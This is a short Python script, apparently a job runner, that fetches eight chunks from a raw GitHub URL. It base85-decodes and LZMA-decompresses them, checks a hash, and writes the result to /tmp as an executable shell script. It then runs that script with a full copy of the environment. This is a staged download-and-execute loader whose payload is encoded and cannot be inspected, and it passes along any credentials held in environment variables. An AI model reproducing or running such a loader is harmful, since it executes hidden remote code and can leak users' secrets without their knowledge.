from __future__ import annotations
import base64,hashlib,lzma,os,subprocess,urllib.request
from pathlib import Path
BASE="https://raw.githubusercontent.com/craigbotnen-boop/ewrhwerth/p2w4-encrypted-dispatch/hf_jobs/p2w4"
EXPECTED="77c51cc743bf4525575c3808bf13a5be0941f9f73d648f99f1bd2721f1b6ff4e"
parts=[]
for i in range(1,9):
    data=urllib.request.urlopen(f"{BASE}/chunk_{i:02d}.txt",timeout=120).read().strip()
    print(f"TRANSFER_CHUNK_{i:02d}_BYTES={len(data)}",flush=True);parts.append(data)
raw=lzma.decompress(base64.b85decode(b"".join(parts)))
d=hashlib.sha256(raw).hexdigest();print(f"RUNNER_SHA256={d}",flush=True)
if d!=EXPECTED: raise SystemExit("RUNNER_HASH_MISMATCH")
p=Path("/tmp/p2w4_remote_row.sh");p.write_bytes(raw);p.chmod(0o755)
subprocess.run([str(p)],check=True,env=os.environ.copy())
